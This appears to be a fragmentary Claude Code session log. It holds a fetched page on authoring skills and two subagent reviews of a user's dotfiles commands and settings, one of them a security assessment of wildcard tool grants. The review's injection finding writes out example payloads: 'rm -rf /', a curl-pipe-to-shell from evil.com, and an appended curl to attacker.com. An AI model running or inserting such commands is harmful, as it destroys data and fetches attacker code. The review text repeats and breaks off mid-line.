session\n---\n\nLog the following to logs/${CLAUDE_SESSION_ID}.log:\n\n$ARGUMENTS\n```\n\n### Add supporting files\n\nSkills can include multiple files in their directory. This keeps `SKILL.md` focused on the essentials while letting Claude access detailed reference material only when needed. Large reference docs, API specifications, or example collections don't need to load into context every time the skill runs.\n\n```\nmy-skill/\n├── SKILL.md (required - overview and navigation)\n├── reference.md (detailed API docs - loaded when needed)\n├── examples.md (usage examples - loaded when needed)\n└── scripts/\n    └── helper.py (utility script - executed, not loaded)\n```\n\nReference supporting files from `SKILL.md` so Claude knows what each file contains and when to load it:\n\n```markdown  theme={null}\n## Additional resources\n\n- For complete API details, see [reference.md](reference.md)\n- For usage examples, see [examples.md](examples.md)\n```\n\n<Tip>Keep `SKILL.md` under 500 lines. Move detailed reference material to separate files.</Tip>\n\n### Control who invokes a skill\n\nBy default, both you and Claude can invoke any skill. You can type `/skill-name` to invoke it directly, and Claude can load it automatically when relevant to your conversation. Two frontmatter fields let you restrict this:\n\n* **`disable-model-invocation: true`**: Only you can invoke the skill. Use this for workflows with side effects or that you want to control timing, like `/commit`, `/deploy`, or `/send-slack-message`. You don't want Claude deciding to deploy because your code looks ready.\n\n* **`user-invocable: false`**: Only Claude can invoke the skill. Use this for background knowledge that isn't actionable as a command. A `legacy-system-context` skill explains how an old system works. Claude should know this when relevant, but `/legacy-system-context` isn't a meaningful action for users to take.\n\nThis example creates a deploy skill that only you can trigger. The `disable-model-invocation: true` field prevents Claude from running it automatically:\n\n```yaml  theme={null}\n---\nname: deploy\ndescription: Deploy the application to production\ndisable-model-invocation: true\n---\n\nDeploy $ARGUMENTS to production:\n\n1. Run the test suite\n2. Build the application\n3. Push to the deployment target\n4. Verify the deployment succeeded\n```\n\nHere's how the two fields affect invocation and context loading:\n\n| Frontmatter                      | You can invoke | Claude can invoke | When loaded into context                                     |\n| :------------------------------- | :------------- | :---------------- | :----------------------------------------------------------- |\n| (default)                        | Yes            | Yes               | Description always in context, full skill loads when invoked |\n| `disable-model-invocation: true` | Yes            | No                | Description not in context, full skill loads when you invoke |\n| `user-invocable: false`          | No             | Yes               | Description always in context, full skill loads when invoked |\n\n<Note>\n  In a regular session, skill descriptions are loaded into context so Claude knows what's available, but full skill content only loads when invoked. [Subagents with preloaded skills](/en/sub-agents#preload-skills-into-subagents) work differently: the full skill content is injected at startup.\n</Note>\n\n### Restrict tool access\n\nUse the `allowed-tools` field to limit which tools Claude can use when a skill is active. This skill creates a read-only mode where Claude can explore files but not modify them:\n\n```yaml  theme={null}\n---\nname: safe-reader\ndescription: Read files without making changes\nallowed-tools: Read, Grep, Glob\n---\n```\n\n### Pass arguments to skills\n\nBoth you and Claude can pass arguments when invoking a skill. Arguments are available via the `$ARGUMENTS` placeholder.\n\nThis skill fixes a GitHub issue by number. The `$ARGUMENTS` placeholder gets replaced with whatever follows the skill name:\n\n```yaml  theme={null}\n---\nname: fix-issue\ndescription: Fix a GitHub issue\ndisable-model-invocation: true\n---\n\nFix GitHub issue $ARGUMENTS following our coding standards.\n\n1. Read the issue description\n2. Understand the requirements\n3. Implement the fix\n4. Write tests\n5. Create a commit\n```\n\nWhen you run `/fix-issue 123`, Claude receives \"Fix GitHub issue 123 following our coding standards...\"\n\nIf you invoke a skill with arguments but the skill doesn't include `$ARGUMENTS`, Claude Code appends `ARGUMENTS: <your input>` to the end of the skill content so Claude still sees what you typed.\n\nTo access individual arguments by position, use `$ARGUMENTS[N]` or the shorter `$N`:\n\n```yaml  theme={null}\n---\nname: migrate-component\ndescription: Migrate a component from one framework to another\n---\n\nMigrate the $ARGUMENTS[0] component from $ARGUMENTS[1] to $ARGUMENTS[2].\nPreserve all existing behavior and tests.\n```\n\nRunning `/migrate-component SearchBar React Vue` replaces `$ARGUMENTS[0]` with `SearchBar`, `$ARGUMENTS[1]` with `React`, and `$ARGUMENTS[2]` with `Vue`. The same skill using the `$N` shorthand:\n\n```yaml  theme={null}\n---\nname: migrate-component\ndescription: Migrate a component from one framework to another\n---\n\nMigrate the $0 component from $1 to $2.\nPreserve all existing behavior and tests.\n```\n\n## Advanced patterns\n\n### Inject dynamic context\n\nThe `!`command\\`\\` syntax runs shell commands before the skill content is sent to Claude. The command output replaces the placeholder, so Claude receives actual data, not the command itself.\n\nThis skill summarizes a pull request by fetching live PR data with the GitHub CLI. The `!`gh pr diff\\`\\` and other commands run first, and their output gets inserted into the prompt:\n\n```yaml  theme={null}\n---\nname: pr-summary\ndescription: Summarize changes in a pull request\ncontext: fork\nagent: Explore\nallowed-tools: Bash(gh *)\n---\n\n## Pull request context\n- PR diff: !`gh pr diff`\n- PR comments: !`gh pr view --comments`\n- Changed files: !`gh pr diff --name-only`\n\n## Your task\nSummarize this pull request...\n```\n\nWhen this skill runs:\n\n1. Each `!`command\\`\\` executes immediately (before Claude sees anything)\n2. The output replaces the placeholder in the skill content\n3. Claude receives the fully-rendered prompt with actual PR data\n\nThis is preprocessing, not something Claude executes. Claude only sees the final result.\n\n<Tip>\n  To enable [extended thinking](/en/common-workflows#use-extended-thinking-thinking-mode) in a skill, include the word \"ultrathink\" anywhere in your skill content.\n</Tip>\n\n### Run skills in a subagent\n\nAdd `context: fork` to your frontmatter when you want a skill to run in isolation. The skill content becomes the prompt that drives the subagent. It won't have access to your conversation history.\n\n<Warning>\n  `context: fork` only makes sense for skills with explicit instructions. If your skill contains guidelines like \"use these API conventions\" without a task, the subagent receives the guidelines but no actionable prompt, and returns without meaningful output.\n</Warning>\n\nSkills and [subagents](/en/sub-agents) work together in two directions:\n\n| Approach                     | System prompt                             | Task                        | Also loads                   |\n| :--------------------------- | :---------------------------------------- | :-------------------------- | :--------------------------- |\n| Skill with `context: fork`   | From agent type (`Explore`, `Plan`, etc.) | SKILL.md content            | CLAUDE.md                    |\n| Subagent with `skills` field | Subagent's markdown body                  | Claude's delegation message | Preloaded skills + CLAUDE.md |\n\nWith `context: fork`, you write the task in your skill and pick an agent type to execute it. For the inverse (defining a custom subagent that uses skills as reference material), see [Subagents](/en/sub-agents#preload-skills-into-subagents).\n\n#### Example: Research skill using Explore agent\n\nThis skill runs research in a forked Explore agent. The skill content becomes the task, and the agent provides read-only tools optimized for codebase exploration:\n\n```yaml  theme={null}\n---\nname: deep-research\ndescription: Research a topic thoroughly\ncontext: fork\nagent: Explore\n---\n\nResearch $ARGUMENTS thoroughly:\n\n1. Find relevant files using Glob and Grep\n2. Read and analyze the code\n3. Summarize findings with specific file references\n```\n\nWhen this skill runs:\n\n1. A new isolated context is created\n2. The subagent receives the skill content as its prompt (\"Research \\$ARGUMENTS thoroughly...\")\n3. The `agent` field determines the execution environment (model, tools, and permissions)\n4. Results are summarized and returned to your main conversation\n\nThe `agent` field specifies which subagent configuration to use. Options include built-in agents (`Explore`, `Plan`, `general-purpose`) or any custom subagent from `.claude/agents/`. If omitted, uses `general-purpose`.\n\n### Restrict Claude's skill access\n\nBy default, Claude can invoke any skill that doesn't have `disable-model-invocation: true` set. Skills that define `allowed-tools` grant Claude access to those tools without per-use approval when the skill is active. Your [permission settings](/en/permissions) still govern baseline approval behavior for all other tools. Built-in commands like `/compact` and `/init` are not available through the Skill tool.\n\nThree ways to control which skills Claude can invoke:\n\n**Disable all skills** by denying the Skill tool in `/permissions`:\n\n```\n# Add to deny rules:\nSkill\n```\n\n**Allow or deny specific skills** using [permission rules](/en/permissions):\n\n```\n# Allow only specific skills\nSkill(commit)\nSkill(review-pr *)\n\n# Deny specific skills\nSkill(deploy *)\n```\n\nPermission syntax: `Skill(name)` for exact match, `Skill(name *)` for prefix match with any arguments.\n\n**Hide individual skills** by adding `disable-model-invocation: true` to their frontmatter. This removes the skill from Claude's context entirely.\n\n<Note>\n  The `user-invocable` field only controls menu visibility, not Skill tool access. Use `disable-model-invocation: true` to block programmatic invocation.\n</Note>\n\n## Share skills\n\nSkills can be distributed at different scopes depending on your audience:\n\n* **Project skills**: Commit `.claude/skills/` to version control\n* **Plugins**: Create a `skills/` directory in your [plugin](/en/plugins)\n* **Managed**: Deploy organization-wide through [managed settings](/en/permissions#managed-settings)\n\n### Generate visual output\n\nSkills can bundle and run scripts in any language, giving Claude capabilities beyond what's possible in a single prompt. One powerful pattern is generating visual output: interactive HTML files that open in your browser for exploring data, debugging, or creating reports.\n\nThis example creates a codebase explorer: an interactive tree view where you can expand and collapse directories, see file sizes at a glance, and identify file types by color.\n\nCreate the Skill directory:\n\n```bash  theme={null}\nmkdir -p ~/.claude/skills/codebase-visualizer/scripts\n```\n\nCreate `~/.claude/skills/codebase-visualizer/SKILL.md`. The description tells Claude when to activate this Skill, and the instructions tell Claude to run the bundled script:\n\n````yaml  theme={null}\n---\nname: codebase-visualizer\ndescription: Generate an interactive collapsible tree visualization of your codebase. Use when exploring a new repo, understanding project structure, or identifying large files.\nallowed-tools: Bash(python *)\n---\n\n# Codebase Visualizer\n\nGenerate an interactive HTML tree view that shows your project's file structure with collapsible directories.\n\n## Usage\n\nRun the visualization script from your project root:\n\n```bash\npython ~/.claude/skills/codebase-visualizer/scripts/visualize.py .\n```\n\nThis creates `codebase-map.html` in the current directory and opens it in your default browser.\n\n## What the visualization shows\n\n- **Collapsible directories**: Click folders to expand/collapse\n- **File sizes**: Displayed next to each file\n- **Colors**: Different colors for different file types\n- **Directory totals**: Shows aggregate size of each folder\n````\n\nCreate `~/.claude/skills/codebase-visualizer/scripts/visualize.py`. This script scans a directory tree and generates a self-contained HTML file with:\n\n* A **summary sidebar** showing file count, directory count, total size, and number of file types\n* A **bar chart** breaking down the codebase by file type (top 8 by size)\n* A **collapsible tree** where you can expand and collapse directories, with color-coded file type indicators\n\nThe script requires Python but uses only built-in libraries, so there are no packages to install:\n\n```python expandable theme={null}\n#!/usr/bin/env python3\n\"\"\"Generate an interactive collapsible tree visualization of a codebase.\"\"\"\n\nimport json\nimport sys\nimport webbrowser\nfrom pathlib import Path\nfrom collections import Counter\n\nIGNORE = {'.git', 'node_modules', '__pycache__', '.venv', 'venv', 'dist', 'build'}\n\ndef scan(path: Path, stats: dict) -> dict:\n    result = {\"name\": path.name, \"children\": [], \"size\": 0}\n    try:\n        for item in sorted(path.iterdir()):\n            if item.name in IGNORE or item.name.startswith('.'):\n                continue\n            if item.is_file():\n                size = item.stat().st_size\n                ext = item.suffix.lower() or '(no ext)'\n                result[\"children\"].append({\"name\": item.name, \"size\": size, \"ext\": ext})\n                result[\"size\"] += size\n                stats[\"files\"] += 1\n                stats[\"extensions\"][ext] += 1\n                stats[\"ext_sizes\"][ext] += size\n            elif item.is_dir():\n                stats[\"dirs\"] += 1\n                child = scan(item, stats)\n                if child[\"children\"]:\n                    result[\"children\"].append(child)\n                    result[\"size\"] += child[\"size\"]\n    except PermissionError:\n        pass\n    return result\n\ndef generate_html(data: dict, stats: dict, output: Path) -> None:\n    ext_sizes = stats[\"ext_sizes\"]\n    total_size = sum(ext_sizes.values()) or 1\n    sorted_exts = sorted(ext_sizes.items(), key=lambda x: -x[1])[:8]\n    colors = {\n        '.js': '#f7df1e', '.ts': '#3178c6', '.py': '#3776ab', '.go': '#00add8',\n        '.rs': '#dea584', '.rb': '#cc342d', '.css': '#264de4', '.html': '#e34c26',\n        '.json': '#6b7280', '.md': '#083fa1', '.yaml': '#cb171e', '.yml': '#cb171e',\n        '.mdx': '#083fa1', '.tsx': '#3178c6', '.jsx': '#61dafb', '.sh': '#4eaa25',\n    }\n    lang_bars = \"\".join(\n        f'<div class=\"bar-row\"><span class=\"bar-label\">{ext}</span>'\n        f'<div class=\"bar\" style=\"width:{(size/total_size)*100}%;background:{colors.get(ext,\"#6b7280\")}\"></div>'\n        f'<span class=\"bar-pct\">{(size/total_size)*100:.1f}%</span></div>'\n        for ext, size in sorted_exts\n    )\n    def fmt(b):\n        if b < 1024: return f\"{b} B\"\n        if b < 1048576: return f\"{b/1024:.1f} KB\"\n        return f\"{b/1048576:.1f} MB\"\n\n    html = f'''<!DOCTYPE html>\n<html><head>\n  <meta charset=\"utf-8\"><title>Codebase Explorer</title>\n  <style>\n    body {{ font: 14px/1.5 system-ui, sans-serif;

The bundled script does the heavy lifting while Claude handles orchestration.\n\n## Troubleshooting\n\n### Skill not triggering\n\nIf Claude doesn't use your skill when expected:\n\n1. Check the description includes keywords users would naturally say\n2. Verify the skill appears in `What skills are available?`\n3. Try rephrasing your request to match the description more closely\n4. Invoke it directly with `/skill-name` if the skill is user-invocable\n\n### Skill triggers too often\n\nIf Claude uses your skill when you don't want it:\n\n1. Make the description more specific\n2. Add `disable-model-invocation: true` if you only want manual invocation\n\n### Claude doesn't see all my skills\n\nSkill descriptions are loaded into context so Claude knows what's available. If you have many skills, they may exceed the character budget. The budget scales dynamically at 2% of the context window, with a fallback of 16,000 characters. Run `/context` to check for a warning about excluded skills.\n\nTo override the limit, set the `SLASH_COMMAND_TOOL_CHAR_BUDGET` environment variable.\n\n## Related resources\n\n* **[Subagents](/en/sub-agents)**: delegate tasks to specialized agents\n* **[Plugins](/en/plugins)**: package and distribute skills with other extensions\n* **[Hooks](/en/hooks)**: automate workflows around tool events\n* **[Memory](/en/memory)**: manage CLAUDE.md files for persistent context\n* **[Interactive mode](/en/interactive-mode#built-in-commands)**: built-in commands and shortcuts\n* **[Permissions](/en/permissions)**: control tool and skill access\n","durationMs":307,"url":"https://code.claude.com/docs/en/skills"},"sourceToolAssistantUUID":"5bdf5058-6e05-4f42-9a3f-6bccc69132e4"}

(e.g., `Bash(gh *)` allows any gh subcommand)\n- Do the dynamic context injection commands (`!`...``) have any command injection risk via `$0`/`$ARGUMENTS`?\n- Is the `permissions.deny` rule for `.entire/metadata/**` appropriate?\n- Are there any overly permissive tool grants?\n\nRead the changed files and provide your security assessment with severity levels.","agentId":"a4637e0"},"toolUseID":"agent_msg_01Dtx3vRXFqfZggdKADGPWYz","parentToolUseID":"toolu_01HCVueUUy8K3crfvEbfCpSq","uuid":"dfa272d2-9048-4e64-be4b-89d53afd78e7","timestamp":"2026-02-15T13:01:22.185Z"}

Overly Broad `Bash(gh *)` in Command Frontmatter\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n\n**Problem:** The `allowed-tools: Bash(gh *)` grant permits any `gh` subcommand, including destructive operations such as `gh repo delete`, `gh release delete`, `gh issue close`, `gh pr close`, `gh api -X DELETE ...`, and arbitrary API calls via `gh api`. This is significantly broader than the project-level `settings.json`, which restricts `gh` to specific safe subcommands (`gh pr view`, `gh pr diff`, `gh pr list`, `gh pr checks`, `gh pr create`, `gh issue create`, `gh run list`, `gh repo view`).\n\n**Improvement:** Restrict `Bash(gh *)` in each command's frontmatter to only the subcommands actually needed. For example, `pr-review.md` only needs `Bash(gh pr view:*)`, `Bash(gh pr diff:*)`, `Bash(gh pr checks:*)`. The `pr-fix.md` command additionally needs `Bash(gh api:*)` for reading review comments, which itself is broad -- consider constraining the API endpoint pattern if possible.\n\n---\n\n### 2. Overly Broad `Bash(git *)` in Command Frontmatter\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 4)\n\n**Problem:** `Bash(git *)` allows any git subcommand, including `git push --force`, `git reset --hard`, `git clean -fd`, and `git rebase`. The commands themselves note \"do not use `git checkout`, `git restore`, `git reset`, `git stash`\" as rules, but these are soft instructions to the LLM, not enforced constraints. The project-level `settings.json` only allows safe git operations (`git add`, `git branch`, `git checkout`, `git diff`, `git log`, `git pull`, `git status`), but per-command `allowed-tools` may override or supplement these.\n\n**Improvement:** Scope each command to the specific git subcommands required. For `commit.md`: `Bash(git add:*)`, `Bash(git commit:*)`, `Bash(git push:*)`, `Bash(git status:*)`, `Bash(git diff:*)`, `Bash(git log:*)`. For `commit-split.md`, similarly restrict. Avoid granting `git reset`, `git force-push`, etc. through wildcards.\n\n---\n\n### 3. Overly Broad `Bash(npm *)` and `Bash(npx *)` Grants\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 4)\n\n**Problem:** `Bash(npm *)` allows `npm install`, `npm publish`, and arbitrary script execution via `npm run`. `Bash(npx *)` allows executing any npm package directly, which could run untrusted code. These are powerful grants that enable arbitrary code execution.\n\n**Improvement:** Restrict to the specific npm/npx commands needed. For CI-fix and test scenarios: `Bash(npm test:*)`, `Bash(npm run lint:*)`, `Bash(npx eslint:*)`, `Bash(npx vitest:*)`, etc. Avoid blanket `npm *` and `npx *` patterns.\n\n---\n\n### 4. Dynamic Context Injection (`!` backtick syntax) -- Command Injection via `$0`/`$ARGUMENTS`\n\n**Severity: Low**\n**Files:** All 8 command files under `/Users/yuki.tanaami/src/dotfiles/commands/`\n\n**Problem:** The `!` backtick syntax injects the output of shell commands into the prompt context at command invocation time. Variables like `$0` and `$ARGUMENTS` are substituted from user input. If a user passes a malicious argument such as `; rm -rf /` or `$(curl evil.com/payload.sh | sh)`, the behavior depends on how Claude Code's command runner handles this substitution.\n\nHowever, in practice this risk is **Low** because:\n- The user invoking the command is the same person who controls the terminal, so there is no privilege escalation.\n- Claude Code's command substitution likely performs the expansion in a controlled context.\n- The commands in the `!` backticks are `gh` and `git` subcommands that would fail or produce garbage output with injected arguments rather than executing arbitrary code.\n\n**Improvement:** Even so, if Claude Code's `!` backtick execution passes `$0`/`$ARGUMENTS` through a shell without sanitization, a crafted argument like `123 --json number -q '.number' ; curl attacker.com` could be appended to `gh pr view`. Validate that Claude Code's command expansion uses proper argument quoting. Consider documenting the expected input format for each argument.\n\n---\n\n### 5. `permissions.deny` for `.entire/metadata/**` Does Not Match Actual Paths\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (line 117)\n\n**Problem:** The deny rule is `Read(./.entire/metadata/**)`, but the actual `.entire` directory structure contains `tmp/`, `logs/`, and `settings.json` -- there is no `metadata/` subdirectory. This means the deny rule is effectively a no-op and does not protect any existing files. If the intent was to protect `.entire/` contents (which includes logs, temporary prompt data, and settings), the path pattern is incorrect.\n\n**Improvement:** If the intent is to protect sensitive `.entire` data, update the deny rule to match actual paths, such as `Read(./.entire/**)`. If the `metadata/` directory is expected to be created by the `entire` tool in the future, this is acceptable but should be documented. Review whether `.entire/tmp/` and `.entire/logs/` also contain sensitive data that should be denied from Read access.\n\n---\n\n### 6. Hooks Executing External `entire` Commands\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (lines 7-82)\n\n**Problem:** Six lifecycle hooks (`PostToolUse`, `PreToolUse`, `SessionEnd`, `SessionStart`, `Stop`, `UserPromptSubmit`) all execute `entire hooks claude-code <event>` commands. This means every session start, end, user prompt, and tool use triggers an external binary. If the `entire` binary is compromised or replaced (e.g., via PATH manipulation), all Claude Code sessions in this environment would be affected.\n\n**Improvement:** This is an inherent trust boundary with external tools and is low severity since the user controls their own PATH and tool installation. However, consider using an absolute path to the `entire` binary (e.g., `/usr/local/bin/entire`) to reduce PATH hijacking risk.\n\n---\n\n### 7. `mcp__playwright__*` Permission in Settings\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (line 114)\n\n**Problem:** `mcp__playwright__*` grants permission for all Playwright MCP operations. The README change indicates Playwright was removed from the toolset, but this permission remains in settings.json. This is a minor inconsistency. If the Playwright MCP server is not configured, the permission is harmless. If it is configured, it grants broad browser automation capabilities.\n\n**Improvement:** If Playwright is no longer used, remove `mcp__playwright__*` from the allow list to follow the principle of least privilege.\n\n---\n\n## Overall Assessment\n\n| Severity | Count | Summary |\n|----------|-------|---------|\n| Critical | 0 | No critical issues found |\n| High | 0 | No high-severity issues found |\n| Medium | 3 | Overly broad tool grants for `gh *`, `git *`, `npm *`/`npx *` in command frontmatter |\n| Low | 4 | Command injection risk (mitigated), incorrect deny path, hook binary trust, stale permission |\n\n**Recommendation:** The most impactful improvement would be tightening the `allowed-tools` in each command's YAML frontmatter (findings 1-3). The current wildcard patterns grant significantly more permissions than the commands actually require, and significantly more than the project-level `settings.json` allows. Applying the principle of least privilege to each command file would meaningfully reduce the attack surface."},{"type":"text","text":"agentId: a4637e0 (for resuming to continue this agent's work if needed)\n<usage>total_tokens: 18182\ntool_uses: 11\nduration_ms: 62243</usage>"}]}]},"uuid":"f8566e77-b8e9-4186-a404-7e3d0a0f5dc6","timestamp":"2026-02-15T13:02:12.948Z","toolUseResult":{"status":"completed","prompt":"Review the following changes for security issues.

There are a few issues worth addressing, ranging from a likely broken dynamic context injection to minor inconsistencies.\n\n---\n\n### [Critical] Unresolved `{owner}/{repo}` placeholder in dynamic context\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 19\n\n```\n!`gh api repos/{owner}/{repo}/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\nThe `{owner}/{repo}` is a literal string. Claude Code's `!` backtick syntax does not perform template variable substitution for `{owner}/{repo}`. This will result in an API call to `repos/{owner}/{repo}/pulls/.../comments` which will return a 404 error from the GitHub API.\n\n**Improvement:** Use `gh api` with the repository auto-detection feature or resolve the owner/repo dynamically:\n\n```\n!`gh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\nAlternatively, use `gh pr view` with `--json reviews,comments` to avoid the raw API call entirely.\n\n---\n\n### [Medium] Inconsistent `$ARGUMENTS` usage across commands\n\n**Files affected:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md`, line 31: `$ARGUMENTS` appears as a standalone line outside any structured section\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md`, line 23: `$ARGUMENTS` appears similarly\n- `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md`, line 21: Uses `$ARGUMENTS` inline within a sentence\n\nMeanwhile, other files use only `$0` or `$1` in their dynamic context injections (e.g., `pr-review.md` uses `$0` in `!` backtick commands but never references `$ARGUMENTS`).\n\nThe inconsistency is in how the arguments are surfaced to the LLM:\n- `review-diff.md` line 31: `対象ファイル・ディレクトリが指定された場合: $ARGUMENTS` -- this is a bare contextual line, which is fine but differs in style from other files.\n- `pr-zero.md` line 23: `オプション: $ARGUMENTS` -- same pattern.\n- `test-create.md` line 21: `$ARGUMENTS` is used within a procedure step.\n\n**Improvement:** Standardize the `$ARGUMENTS` injection pattern. Consider placing all `$ARGUMENTS` references in a consistent location (e.g., under the \"Usage\" section or under a dedicated \"Arguments\" section) across all commands that accept arguments.\n\n---\n\n### [Medium] Inconsistent fallback patterns in dynamic context\n\n**Files affected:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`: Uses `2>/dev/null || <fallback>` pattern for PR number-optional commands\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md`, line 16: Uses `2>/dev/null || echo \"PRが見つかりません\"` (fallback to echo)\n- `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md`, line 18: Uses `2>/dev/null;` (semicolon, not `||`) to chain two git diff commands\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md`: No fallback patterns at all (assumes `$0` is always provided)\n\nThe `test-create.md` uses `;` instead of `||` on line 18:\n```\n!`git diff --name-only HEAD 2>/dev/null; git diff --name-only --cached 2>/dev/null`\n```\n\nThis is technically correct (both commands should run), but it differs from the `||` fallback pattern used elsewhere. This is actually the right behavior here since both staged and unstaged changes should be listed, but a comment explaining this would help maintainability.\n\n**Improvement:** Add a brief comment or standardize the approach. Also, `pr-review.md` has no fallback for missing `$0`, meaning if a user runs `/pr-review` without arguments, all four `gh pr view $0` commands will fail. Consider adding the same fallback pattern used in `pr-fix.md`.\n\n---\n\n### [Medium] `allowed-tools` inconsistencies\n\nComparing `allowed-tools` across commands:\n\n| Command | Write/Edit | Linters | WebFetch | npm/npx |\n|---------|-----------|---------|----------|---------|\n| `pr-review.md` | No | No | Yes | No |\n| `pr-fix.md` | Yes | No | Yes | Yes |\n| `ci-fix.md` | Yes | Yes (ruff, golangci-lint) | No | Yes |\n| `review-diff.md` | No | Yes (ruff, golangci-lint) | No | Yes (npm, npx) |\n| `test-create.md` | Yes (Write only) | No | No | Yes |\n| `commit.md` | No | No | No | No |\n| `commit-split.md` | No | No | No | No |\n| `pr-zero.md` | No | No | No | No |\n\nObservations:\n1. `review-diff.md` includes `Bash(npm *)` and `Bash(npx *)` but no `Write` or `Edit`. If the review command runs linters with auto-fix (e.g., `npx eslint --fix`), it would modify files but lacks `Write`/`Edit` permissions. However, since the command description says it only reviews (read-only), including `npm`/`npx` seems unnecessary unless it runs linters in check-only mode. If linters are run in check mode only, then `npm`/`npx` is fine, but `Bash(ruff *)` and `Bash(golangci-lint *)` could potentially auto-fix without `Write` permission.\n\n2. `ci-fix.md` includes `Bash(ruff *)` and `Bash(golangci-lint *)` but `pr-fix.md` does not. Since `pr-fix.md` also handles CI errors (line 29: \"lint/type/test/build エラーを自動修正\"), it should probably include linter tools as well.\n\n3. `test-create.md` includes `Write` but not `Edit`. If generating tests requires modifying existing test files, `Edit` would be needed.\n\n**Improvement:**\n- Add `Bash(ruff *)` and `Bash(golangci-lint *)` to `pr-fix.md` since it handles CI lint errors.\n- Add `Edit` to `test-create.md` for modifying existing test files.\n- Consider removing `Bash(npm *)` and `Bash(npx *)` from `review-diff.md` if it is strictly read-only, or add `Write`/`Edit` if auto-fix is intended.\n\n---\n\n### [Low] Frontmatter consistency -- minor field ordering differences\n\nAll 8 files use YAML frontmatter with `description` and `allowed-tools`. Some also have `argument-hint`. The field order is consistent: `description`, then `argument-hint` (when present), then `allowed-tools`. This is good.\n\nHowever, `ci-fix.md` and `commit.md` do not have `argument-hint` (correctly, since they take no arguments), while `commit-split.md` has `argument-hint` for optional parameters. This is appropriate and consistent.\n\nNo issues found here.\n\n---\n\n### [Low] `commit-split.md` uses `$0` and `$1` but documents them as positional inside the body\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md`, lines 17-18\n\n```markdown\n- ベースブランチ ($0): 比較対象（省略時はmaster/mainを自動検出）\n- 分割方式 ($1): `file`（ファイル単位）、`feature`（機能単位）、`interactive`（インタラクティブ）\n```\n\nThese `$0` and `$1` references are documentation only and are not used in any `!` backtick dynamic context injection. If Claude Code does not automatically substitute `$0`/`$1` in plain text (only in `!` backtick blocks), these serve as documentation hints rather than functional substitutions. This is fine but differs from how `pr-review.md` and `pr-fix.md` use `$0` inside `!` backtick commands where it is functionally substituted.\n\nNo action required, but worth noting for documentation clarity.\n\n---\n\n### [Low] `settings.json` -- `Bash(grep:*)` permission is redundant\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, line 108\n\nThe `Grep` tool is already in the `allow` list (line 87: `\"Read\"`). Additionally, Claude Code's built-in `Grep` tool (which this review agent uses) is separate from `Bash(grep:*)`.

There are a few issues worth addressing, ranging from a likely broken dynamic context injection to minor inconsistencies.\n\n---\n\n### [Critical] Unresolved `{owner}/{repo}` placeholder in dynamic context\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 19\n\n```\n!`gh api repos/{owner}/{repo}/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\nThe `{owner}/{repo}` is a literal string. Claude Code's `!` backtick syntax does not perform template variable substitution for `{owner}/{repo}`. This will result in an API call to `repos/{owner}/{repo}/pulls/.../comments` which will return a 404 error from the GitHub API.\n\n**Improvement:** Use `gh api` with the repository auto-detection feature or resolve the owner/repo dynamically:\n\n```\n!`gh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\nAlternatively, use `gh pr view` with `--json reviews,comments` to avoid the raw API call entirely.\n\n---\n\n### [Medium] Inconsistent `$ARGUMENTS` usage across commands\n\n**Files affected:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md`, line 31: `$ARGUMENTS` appears as a standalone line outside any structured section\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md`, line 23: `$ARGUMENTS` appears similarly\n- `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md`, line 21: Uses `$ARGUMENTS` inline within a sentence\n\nMeanwhile, other files use only `$0` or `$1` in their dynamic context injections (e.g., `pr-review.md` uses `$0` in `!` backtick commands but never references `$ARGUMENTS`).\n\nThe inconsistency is in how the arguments are surfaced to the LLM:\n- `review-diff.md` line 31: `対象ファイル・ディレクトリが指定された場合: $ARGUMENTS` -- this is a bare contextual line, which is fine but differs in style from other files.\n- `pr-zero.md` line 23: `オプション: $ARGUMENTS` -- same pattern.\n- `test-create.md` line 21: 